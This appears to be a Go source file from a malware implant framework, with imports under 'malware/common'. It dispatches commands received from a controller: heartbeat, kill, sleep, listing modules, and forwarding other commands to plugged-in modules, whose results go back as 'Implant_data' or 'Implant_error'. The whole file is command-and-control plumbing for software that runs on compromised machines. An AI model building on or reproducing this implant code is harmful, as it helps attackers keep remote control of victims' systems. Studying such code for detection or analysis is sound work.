package included_modules

import (
	"malware/common/messages"
	"malware/common/types"
	"time"
	_INCLUDED_MODULES_IMPORT_
)

//List of modules
var Modules = []types.Module{
	_INCLUDED_MODULES_
}

// Returns true if should exit
func HandleMessage(reply *messages.CheckCmdReply, callback func(msg *messages.CheckCmdRequest)) bool {
	// If a message doesn't contain a heartbeat we need to decode it
	if reply.GetHeartbeat() != 0 {
		return false
	}

	if reply.GetKill() {
		return true
	}

	if reply.GetSleep() != 0 {
		time.Sleep(time.Duration(reply.GetSleep()) * time.Second)
		return false
	}

	if reply.GetListmodules() {
		modules := ""
		for _, module := range Modules {
			modules += module.ID() + " "
		}
		callback(messages.Implant_data("list", []byte(modules)))
		return false
	}

	for _, module := range Modules {
		if module.HandleMessage(reply, callback) {
			return false
		}
	}

	// Message was not handled, send error message
	callback(messages.Implant_error("sys", types.ERR_MODULE_NOT_IMPL))
	return false
}
